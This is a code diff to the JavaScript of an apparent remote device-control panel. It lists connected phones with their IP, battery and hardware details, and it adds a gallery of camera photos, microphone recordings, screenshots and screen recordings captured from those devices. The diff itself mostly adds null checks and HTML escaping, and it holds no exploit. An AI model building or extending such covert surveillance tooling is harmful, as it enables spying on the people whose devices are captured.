@@ -69,6 +69,7 @@ const MOBILE_COMMANDS = {
 
 function initMobileControl() {
     refreshMobileClients();
+    refreshMobileCaptures();
     mobileRefreshInterval = setInterval(refreshMobileClients, 4000);
     document.getElementById('btn-refresh-mobile')?.addEventListener('click', refreshMobileClients);
 
@@ -156,9 +157,11 @@ async function refreshMobileClients() {
         }
 
         listEl.innerHTML = mobileClients.map(client => {
+            var clientUid = client.uid || '';
+            var clientInfo = client.info || {};
             var isSelected = selectedMobileClient === client.uid;
-            var batteryLevel = client.info.battery?.level || 'N/A';
-            var batteryCharging = client.info.battery?.charging ? '⚡' : '';
+            var batteryLevel = clientInfo.battery?.level || 'N/A';
+            var batteryCharging = clientInfo.battery?.charging ? '⚡' : '';
             var batteryColor = 'text-slate-400';
             if (typeof batteryLevel === 'number') {
                 if (batteryLevel > 60) batteryColor = 'text-emerald-400';
@@ -166,7 +169,7 @@ async function refreshMobileClients() {
                 else batteryColor = 'text-red-400';
             }
 
-            var platform = client.info.platform || 'Unknown';
+            var platform = clientInfo.platform || 'Unknown';
             var platformIcon = 'fa-mobile-alt';
             if (platform.toLowerCase().includes('android')) platformIcon = 'fa-android';
             else if (platform.toLowerCase().includes('ios') || platform.toLowerCase().includes('iphone')) platformIcon = 'fa-apple';
@@ -178,11 +181,11 @@ async function refreshMobileClients() {
             return `
             <div class="mobile-client-item ${isSelected ? 'bg-blue-600/20 border-blue-500 ring-1 ring-blue-500/30' : 'bg-slate-800 border-slate-700'} 
                  border rounded-lg p-3 cursor-pointer hover:bg-slate-700 transition-all mb-2"
-                 onclick="selectMobileClient('${client.uid}')">
+                 onclick="selectMobileClient('${clientUid}')">
                 <div class="flex items-center justify-between mb-2">
                     <div class="flex items-center space-x-2">
                         <i class="fab ${platformIcon} text-slate-400"></i>
-                        <span class="text-xs font-bold text-slate-300 truncate">${client.uid.substring(0, 16)}...</span>
+                        <span class="text-xs font-bold text-slate-300 truncate">${clientUid.substring(0, 16)}${clientUid.length > 16 ? '...' : ''}</span>
                     </div>
                     <span class="text-[10px] px-2 py-0.5 rounded-full ${client.seconds_ago < 30 ? 'bg-emerald-500/20 text-emerald-400 animate-pulse' : 'bg-yellow-500/20 text-yellow-400'}">
                         ${ageStr}
@@ -192,9 +195,9 @@ async function refreshMobileClients() {
                     <div><i class="fas fa-mobile-alt w-3"></i> ${platform}</div>
                     <div><i class="fas fa-network-wired w-3"></i> ${client.ip}</div>
                     <div class="${batteryColor}"><i class="fas fa-battery-half w-3"></i> ${batteryLevel}${typeof batteryLevel === 'number' ? '%' : ''} ${batteryCharging}</div>
-                    <div><i class="fas fa-desktop w-3"></i> ${client.info.screenWidth || '?'}×${client.info.screenHeight || '?'}</div>
-                    ${client.info.connection ? `<div><i class="fas fa-wifi w-3"></i> ${client.info.connection.type || '?'}</div>` : ''}
-                    ${client.info.cores ? `<div><i class="fas fa-microchip w-3"></i> ${client.info.cores} cores</div>` : ''}
+                    <div><i class="fas fa-desktop w-3"></i> ${clientInfo.screenWidth || '?'}×${clientInfo.screenHeight || '?'}</div>
+                    ${clientInfo.connection ? `<div><i class="fas fa-wifi w-3"></i> ${clientInfo.connection.type || '?'}</div>` : ''}
+                    ${clientInfo.cores ? `<div><i class="fas fa-microchip w-3"></i> ${clientInfo.cores} cores</div>` : ''}
                 </div>
             </div>`;
         }).join('');
@@ -203,9 +206,68 @@ async function refreshMobileClients() {
     }
 }
 
+function escapeMobileHtml(str) {
+    if (str === null || str === undefined) return '';
+    return String(str)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#39;');
+}
+
+async function refreshMobileCaptures() {
+    var grid = document.getElementById('mobile-captures');
+    if (!grid) return;
+
+    try {
+        var response = await fetch('/api/mobile/captures');
+        var data = await response.json();
+        var captures = data.captures || [];
+
+        if (captures.length === 0) {
+            grid.innerHTML = '<div class="col-span-full text-center text-slate-600 py-4 text-xs">No captures yet</div>';
+            return;
+        }
+
+        grid.innerHTML = captures.map(function (cap) {
+            var url = escapeMobileHtml(cap.url);
+            var isImage = cap.type === 'screenshot' || cap.type === 'camera';
+            var isVideo = cap.type === 'screen_record';
+
+            var preview;
+            if (isImage) {
+                preview = '<img src="' + url + '" class="w-full h-20 object-cover rounded cursor-pointer" onclick="window.open(this.src)">';
+            } else if (isVideo) {
+                preview = '<video src="' + url + '" class="w-full h-20 object-cover rounded" controls></video>';
+            } else {
+                preview = '<audio src="' + url + '" class="w-full" controls></audio>';
+            }
+
+            var label = {
+                'screenshot': 'Screenshot',
+                'camera': 'Camera Photo',
+                'audio': 'Microphone',
+                'screen_record': 'Screen Recording'
+            }[cap.type] || cap.type;
+
+            return '<div class="bg-slate-800 border border-slate-700 rounded-lg p-2">'
+                + preview
+                + '<div class="text-[10px] text-slate-300 mt-1 truncate">' + escapeMobileHtml(label) + '</div>'
+                + '<div class="text-[9px] text-slate-500 truncate">' + escapeMobileHtml(cap.uid || '') + '</div>'
+                + '<div class="text-[9px] text-slate-600 truncate">' + escapeMobileHtml(cap.timestamp || '') + '</div>'
+                + '</div>';
+        }).join('');
+    } catch (e) {
+        console.error('Failed to refresh mobile captures:', e);
+    }
+}
+
 function selectMobileClient(uid) {
     selectedMobileClient = uid;
     const client = mobileClients.find(c => c.uid === uid);
+    const clientUid = client ? (client.uid || '') : '';
+    const info = client ? (client.info || {}) : {};
 
     if (client) {
         const infoEl = document.getElementById('mobile-device-info');
@@ -215,9 +277,9 @@ function selectMobileClient(uid) {
             infoEl.classList.remove('hidden');
 
             var batteryHtml = '';
-            if (client.info.battery) {
-                var level = client.info.battery.level || 0;
-                var charging = client.info.battery.charging ? ' ⚡ Charging' : '';
+            if (info.battery) {
+                var level = info.battery.level || 0;
+                var charging = info.battery.charging ? ' ⚡ Charging' : '';
                 var barColor = level > 60 ? 'bg-emerald-500' : level > 20 ? 'bg-yellow-500' : 'bg-red-500';
                 batteryHtml = `
                     <div class="col-span-2 mt-1">
@@ -233,33 +295,33 @@ function selectMobileClient(uid) {
 
             infoContent.innerHTML = `
                 <div class="text-slate-400"><i class="fas fa-fingerprint"></i> UID:</div>
-                <div class="text-white font-mono text-[10px] truncate">${client.uid}</div>
+                <div class="text-white font-mono text-[10px] truncate">${clientUid}</div>
                 <div class="text-slate-400"><i class="fas fa-mobile-alt"></i> Platform:</div>
-                <div class="text-white">${client.info.platform || 'Unknown'}</div>
+                <div class="text-white">${info.platform || 'Unknown'}</div>
                 <div class="text-slate-400"><i class="fas fa-desktop"></i> Screen:</div>
-                <div class="text-white">${client.info.screenWidth || '?'}×${client.info.screenHeight || '?'} (${client.info.pixelRatio || 1}x)</div>
+                <div class="text-white">${info.screenWidth || '?'}×${info.screenHeight || '?'} (${info.pixelRatio || 1}x)</div>
                 <div class="text-slate-400"><i class="fas fa-globe"></i> Language:</div>
-                <div class="text-white">${client.info.language || 'Unknown'}</div>
+                <div class="text-white">${info.language || 'Unknown'}</div>
                 <div class="text-slate-400"><i class="fas fa-clock"></i> Timezone:</div>
-                <div class="text-white">${client.info.timezone || 'Unknown'}</div>
+                <div class="text-white">${info.timezone || 'Unknown'}</div>
                 <div class="text-slate-400"><i class="fas fa-microchip"></i> CPU:</div>
-                <div class="text-white">${client.info.cores || '?'} cores</div>
+                <div class="text-white">${info.cores || '?'} cores</div>
                 <div class="text-slate-400"><i class="fas fa-memory"></i> RAM:</div>
-                <div class="text-white">${client.info.memory || '?'} GB</div>
+                <div class="text-white">${info.memory || '?'} GB</div>
                 <div class="text-slate-400"><i class="fas fa-network-wired"></i> IP:</div>
                 <div class="text-blue-400">${client.ip}</div>
-                ${client.info.connection ? `
+                ${info.connection ? `
                     <div class="text-slate-400"><i class="fas fa-wifi"></i> Connection:</div>
-                    <div class="text-white">${client.info.connection.type || '?'} ${client.info.connection.downlink ? '(' + client.info.connection.downlink + ' Mbps)' : ''}</div>
+                    <div class="text-white">${info.connection.type || '?'} ${info.connection.downlink ? '(' + info.connection.downlink + ' Mbps)' : ''}</div>
                 ` : ''}
                 <div class="text-slate-400"><i class="fas fa-user-agent"></i> User Agent:</div>
-                <div class="text-slate-500 text-[9px] col-span-2 truncate">${client.info.userAgent || 'Unknown'}</div>
+                <div class="text-slate-500 text-[9px] col-span-2 truncate">${info.userAgent || 'Unknown'}</div>
                 ${batteryHtml}
             `;
         }
 
         addMobileOutput(`✅ Connected to device: ${uid.substring(0, 20)}...`, 'success');
-        addMobileOutput(`📱 ${client.info.platform || 'Unknown'} | 📍 ${client.ip} | 🔋 ${client.info.battery?.level || '?'}%`, 'info');
+        addMobileOutput(`📱 ${info.platform || 'Unknown'} | 📍 ${client.ip} | 🔋 ${info.battery?.level || '?'}%`, 'info');
 
         if (typeof playNotificationSound === 'function') playNotificationSound();
     }
